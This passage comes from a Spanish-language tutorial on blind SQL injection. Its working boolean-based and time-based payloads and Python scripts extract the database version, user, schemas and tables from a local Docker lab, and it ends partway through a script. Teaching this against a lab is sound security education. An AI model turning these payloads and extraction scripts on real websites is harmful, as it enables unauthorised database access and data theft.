</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select version() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>versions</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>versions</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>version</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div></details><details><summary>user() [Usuario que ejecuta la base de datos]</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>user</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; python3 main.py
</span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Probando con: <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Usuario: 
</span></span><span class=line><span class=cl>    <span class=o>[</span>*<span class=o>]</span> root@172.19.0.3
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Usuario&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>users</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>user</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select user() limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>v_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>users</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>v_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select user() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>users</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>users</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div></details><details><summary>database() [Base de datos en uso]</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>database</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; python3 main.py
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Probando con: e
</span></span><span class=line><span class=cl><span class=o>[</span> <span class=o>]</span> Base de datos en uso: 
</span></span><span class=line><span class=cl>    <span class=o>[</span>*<span class=o>]</span> my_database
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Base de datos en uso&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>databases</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>db</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select database() limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>db_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>databases</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>db_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select database() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>databases</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>databases</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div></details><h2 id=basada-en-tiempo-a-ciegas>Basada en tiempo a ciegas</h2><div class="callout callout-note d-flex flex-row mt-4 mb-4 pt-4 pe-4 pb-2 ps-3"><svg class="info-circle svg-inline callout-icon me-2 mb-3" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 9h.01"/><path d="M11 12h1v4h1"/></svg><div class=callout-content><div class=callout-title><p>Laboratorio</p></div><div class=callout-body><p>Para la explicación se va a usar el laboratorio 3:</p><ul><li><p>Descarga el <a href=labs/lab3.zip>laboratorio</a></p></li><li><p>Descomprímelo y entra a la carpeta</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>unzip lab3.zip
</span></span><span class=line><span class=cl><span class=nb>cd</span> lab3
</span></span></code></pre></div><p>Despliega el contenedor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker-compose up --build
</span></span></code></pre></div></div></div></div><p>En estas inyecciones no vamos a estar viendo el output, así que vamos a jugar con los tiempos de carga del servidor</p><p>Empezamos mandando una petición en la cual le decimos a la base de datos que se espere 5 segundos, Para saber si la inyección funciona, vamos a usar el comando time el cual nos dirá cuanto ha tardado</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; <span class=nb>time</span> curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and sleep(5) -- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	5.03s
</span></span></code></pre></div><p>Ha tardado 5.03 segundos lo que significa que aparentemente ha funcionado la inyección</p><h3 id=base-de-datos-1>Base de datos</h3><p>Para enumerar las bases de datos vamos a usar el siguiente payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>joan</span><span class=s1>&#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=&#39;</span><span class=n>a</span><span class=s1>&#39;,sleep(5),1)-- -  
</span></span></span></code></pre></div><p>¿Qué estamos haciendo con esto?</p><p>Le estamos diciendo que &ldquo;si el nombre de la primera base de datos empieza por &lsquo;a&rsquo;, quédate esperando 5 segundos&rdquo;</p><p>Esto no tardará 5 segundos, ya que no empieza por a, pero con la m si se queda colgado.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; <span class=nb>time</span> curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=&#39;a&#39;,sleep(5),1)-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nombre: Joan
</span></span><span class=line><span class=cl>Rol: admin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	0.01s
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                           
</span></span><span class=line><span class=cl>&gt; <span class=nb>time</span> curl -s -G <span class=s2>&#34;localhost&#34;</span> --data-urlencode <span class=s2>&#34;nombre=joan&#39; and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)=&#39;m&#39;,sleep(5),1)-- -&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/&lt;br&gt;/\n/g&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>real	5.02s
</span></span></code></pre></div><p>Si lo hacemos manualmente vamos a tardar mucho, así que podemos hacer un script en python que lo automatice</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mf>0.05</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>database</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Bases de datos&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>database</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if((select count(schema_name) from information_schema.schemata)=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dbs</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>db</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dbs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>db_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                    
</span></span><span class=line><span class=cl>        <span class=n>database</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>db_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>database</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>database</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl><span class=n>database</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=tables>Tables</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mf>0.05</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tables</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Tablas&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tables</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if((select count(table_name) from information_schema.tables where table_schema = &#39;my_database&#39;)=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tbs</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>tb</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>tbs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select table_name from information_schema.tables where table_schema = &#39;my_database&#39; limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>tb</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>tb_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>tables</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
